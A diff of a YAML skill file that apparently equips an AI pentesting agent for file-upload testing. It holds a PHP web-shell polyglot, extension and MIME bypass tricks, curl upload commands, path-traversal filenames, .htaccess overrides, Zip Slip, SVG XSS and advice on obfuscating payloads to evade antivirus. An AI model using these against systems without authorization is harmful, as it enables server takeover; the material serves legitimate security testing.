@@ -1,66 +1,65 @@
 schema_version: 1
 version: 3.0.0
 name: file-upload
-description: Senior file upload security testing — extension filtering bypasses, MIME magic-byte polyglots, Zip Slip, .htaccess/.user.ini overrides, and cloud storage exploitation.
+description: >
+  Senior web application file upload security testing — multipart form data analysis, extension
+  filtering bypasses (alternative extensions, double extensions, trailing dots/spaces), MIME-type
+  spoofing, uploaded asset path discovery, and direct script execution verification.
 triggers:
   - file upload
   - upload
   - fileupload
-  - webshell
-  - polyglot
-  - zip slip
-  - mime type
   - avatar upload
   - dosya yükleme
+  - multipart upload
+  - extension bypass
+  - upload filter
 tools:
   - curl
+  - python3
 knowledge: |
-  Assess file upload attack surfaces systematically like a senior red-team operator across extension parsing, MIME checks, and handler configurations.
+  Assess HTTP file upload endpoints with senior red-team precision using an algorithmic 4-stage pipeline.
+  Never spray random extensions; systematically test server-side parser tolerances and execution permissions.
 
-  1. EXTENSION FILTERING BYPASS MATRIX:
-     When standard `.php`, `.jsp`, or `.aspx` extensions are blocked:
-     • Alternative Executable Extensions:
-       PHP: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.inc`
-       Java: `.jspx`, `.jspf`, `.war`
-       ASP.NET: `.ashx`, `.asmx`, `.asp`, `.cer`, `.asa`
-     • Case Variation & Mixed-Casing: `.pHp`, `.PhAr`, `.pHTML`, `.aSpX`
-     • Double Extensions: `report.jpg.php`, `avatar.png.phtml`
-     • Path and Trailing Byte Obfuscation:
-       Trailing dot/space: `shell.php.`, `shell.php `
-       NTFS Alternate Data Streams (IIS): `shell.php::$DATA`
+  1. UPLOAD SURFACE & STORAGE RECONNAISSANCE:
+     Inspect the upload form and response structure:
+       curl -s -F "file=@test.txt;type=text/plain" "https://target/api/upload" -v
+     Determine Storage Mechanics:
+       - Direct web-root storage (e.g. /uploads/test.txt) -> direct execution possible.
+       - Random UUID rename (e.g. /files/4f3a9e.bin) -> requires path disclosure or LFI to execute.
+       - Cloud storage redirect (e.g. s3.amazonaws.com) -> isolate testing to bucket permissions.
 
-  2. MIME MAGIC-BYTE SPOOFING & POLYGLOTS:
-     When server validates content headers using magic bytes:
-     • GIF89a Polyglot:
-       Prepend `GIF89a;` to payload while setting `Content-Type: image/gif`:
-       `GIF89a; <?php echo passthru($_GET['c']); ?>`
-     • JPEG Polyglot:
-       Embed payload within EXIF metadata comments using jpegsnoop or raw hex prepending (`\xFF\xD8\xFF\xE0`).
+  2. EXTENSION PARSING & BLACKLIST BYPASS:
+     When standard extensions (.php, .jsp, .aspx) return HTTP 400/403:
+     Test alternative executable handlers:
+       - PHP: .php3, .php4, .php5, .phtml, .pht, .phar, .inc
+       - Java: .jspx, .jspf, .war
+       - ASP.NET: .ashx, .asmx, .cer, .asa
+     Test parser differentials:
+       - Double extension: avatar.jpg.php (Apache mod_negotiation evaluates right-to-left)
+       - Trailing characters: shell.php. or shell.php%20 (Windows filesystem strips trailing dots/spaces)
+       - Case permutation: shell.pHp, shell.PhP
+       - NTFS ADS (IIS): shell.php::$DATA
 
-  3. SERVER HANDLER & CONFIGURATION OVERRIDES:
-     When file uploads land inside the web directory:
-     • Apache `.htaccess` Override:
-       Upload a file named `.htaccess` containing:
-       `AddType application/x-httpd-php .jpg`
-       Then upload and request `payload.jpg`.
-     • PHP-FPM `.user.ini` Override:
-       Upload `.user.ini` containing:
-       `auto_prepend_file=image.jpg`
-       Forces every PHP script in that directory to include and execute `image.jpg`.
+  3. MIME-TYPE & CONTENT-TYPE HEADER MANIPULATION:
+     Many naive filters inspect only the client-provided Content-Type header:
+       curl -s -F "file=@shell.php;filename=shell.phtml;type=image/png" "https://target/api/upload"
+     If the server accepts shell.phtml because Content-Type claims image/png, extension filtering is absent.
 
-  4. ARCHIVE EXTRACTION VULNERABILITIES (ZIP SLIP):
-     When the application accepts `.zip`, `.tar.gz`, or `.rar` for extraction:
-     • Craft zip archive containing entries with directory traversal paths:
-       `../../../../var/www/html/shell.php`
-     • If extraction does not sanitize relative paths, the file overwrites web root assets.
-
-  5. CLIENT-SIDE STORED XSS (SVG VECTORS):
-     When image uploads are accepted and served directly:
-     • Upload SVG with embedded JavaScript:
-       `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
-     • If served without `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, script executes in browser context.
+  4. EXECUTION VERIFICATION & SITUATION HANDLING:
+     - Canary Probe: Upload a benign verification file: `<?php echo 'CANARY_OK'; ?>`
+     - Request the uploaded asset: `curl -s "https://target/uploads/shell.phtml"`
+     - If output contains `CANARY_OK` without raw source code: execution confirmed.
+     - Situation Handling:
+       * 403 Forbidden on uploads directory: Execution may be disabled via Apache Options -ExecCGI
+         or Nginx location block. Attempt path traversal in filename parameter:
+         `filename=../shell.phtml` to drop the file outside the restricted directory.
+       * 413 Payload Too Large: Chunk the payload or strip non-essential headers.
+       * Anti-virus deletion: If file disappears immediately, EDR/AV signature matched payload.
+         Encode payload using minimal obfuscation (string concatenation or base64 decoding).
 references:
-  - persona:file-upload-v3
+  - https://portswigger.net/web-security/file-upload
+  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 provenance:
   origin: builtin
   source: persona/v0.1/skills/file-upload.yaml
